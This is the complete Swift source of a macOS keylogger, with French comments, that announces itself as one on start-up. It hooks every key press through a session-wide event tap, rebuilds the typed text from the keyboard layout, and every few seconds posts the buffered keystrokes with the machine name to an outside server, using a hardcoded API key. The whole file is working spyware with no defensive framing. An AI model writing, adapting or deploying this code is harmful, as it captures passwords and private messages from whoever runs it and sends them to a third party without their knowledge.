import Foundation
import Cocoa
import Carbon

// --- CONFIGURATION ---
let serverURL = URL(string: "https://api.keylog.claverie.site/upload_keys")!
let apiKey = "72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
let machineID = Host.current().localizedName ?? "Mac-Unknown"
let bufferLimit = 10
let timeLimit = 2.0

// --- VARIABLES GLOBALES ---
var logBuffer = ""
var lastSendTime = Date()
var bufferLock = NSLock()

// --- FONCTION D'ENVOI RÉSEAU ---
func sendLogs() {
    bufferLock.lock()
    if logBuffer.isEmpty {
        bufferLock.unlock()
        return
    }
    let logsToSend = logBuffer
    logBuffer = ""
    lastSendTime = Date()
    bufferLock.unlock()
    
    let json: [String: Any] = [
        "machine": machineID,
        "logs": logsToSend
    ]
    
    guard let jsonData = try? JSONSerialization.data(withJSONObject: json, options: []) else { return }
    
    var request = URLRequest(url: serverURL)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
    request.httpBody = jsonData
    request.timeoutInterval = 10
    
    let task = URLSession.shared.dataTask(with: request) { _, _, _ in }
    task.resume()
}

// --- TRADUCTION DES TOUCHES ---
func stringFromKeyCode(_ keyCode: CGKeyCode, _ event: CGEvent) -> String? {
    switch keyCode {
    case 36, 76: return "\n"
    case 48: return "\t"
    case 53: return "" // ESC
    case 123, 124, 125, 126: return "" // Flèches
    default: break
    }
    
    var length = 0
    var chars = [UniChar](repeating: 0, count: 4)
    var deadKeyState: UInt32 = 0
    
    // Récupération sécurisée du Layout Clavier
    let source = TISCopyCurrentKeyboardInputSource().takeRetainedValue()
    guard let layoutData = TISGetInputSourceProperty(source, kTISPropertyUnicodeKeyLayoutData) else { return nil }
    
    let dataRef = unsafeBitCast(layoutData, to: CFData.self)
    guard let ptr = CFDataGetBytePtr(dataRef) else { return nil }
    
    let flags = event.flags
    let modifierKeyState = (flags.rawValue >> 16) & 0xFF
    
    // CORRECTION FINALE : On ajoute "_ =" pour ignorer le warning "unused result"
    _ = ptr.withMemoryRebound(to: UCKeyboardLayout.self, capacity: 1) { layoutPtr in
        UCKeyTranslate(
            layoutPtr,
            keyCode,
            UInt16(kUCKeyActionDown),
            UInt32(modifierKeyState),
            UInt32(LMGetKbdType()),
            UInt32(kUCKeyTranslateNoDeadKeysBit),
            &deadKeyState,
            4,
            &length,
            &chars
        )
    }
    
    if length > 0 {
        return String(utf16CodeUnits: chars, count: length)
    }
    return nil
}

// --- CALLBACK (HOOK) ---
let eventCallback: CGEventTapCallBack = { proxy, type, event, refcon in
    if type == .keyDown {
        let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
        
        // Gestion Backspace propre
        if keyCode == 51 {
            bufferLock.lock()
            if !logBuffer.isEmpty {
                logBuffer.removeLast()
            }
            bufferLock.unlock()
            return Unmanaged.passUnretained(event)
        }
        
        if let text = stringFromKeyCode(CGKeyCode(keyCode), event) {
            bufferLock.lock()
            logBuffer += text
            let shouldSend = logBuffer.count >= bufferLimit
            bufferLock.unlock()
            
            if shouldSend {
                sendLogs()
            }
        }
    }
    return Unmanaged.passUnretained(event)
}

// --- MAIN ---
print("Keylogger Swift Native démarré...")

Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
    if Date().timeIntervalSince(lastSendTime) >= timeLimit {
        sendLogs()
    }
}

let eventMask = (1 << CGEventType.keyDown.rawValue)

guard let eventTap = CGEvent.tapCreate(
    tap: .cgSessionEventTap,
    place: .headInsertEventTap,
    options: .defaultTap,
    eventsOfInterest: CGEventMask(eventMask),
    callback: eventCallback,
    userInfo: nil
) else {
    print("Erreur: Permissions manquantes.")
    exit(1)
}

let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0)
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
CGEvent.tapEnable(tap: eventTap, enable: true)

CFRunLoopRun()
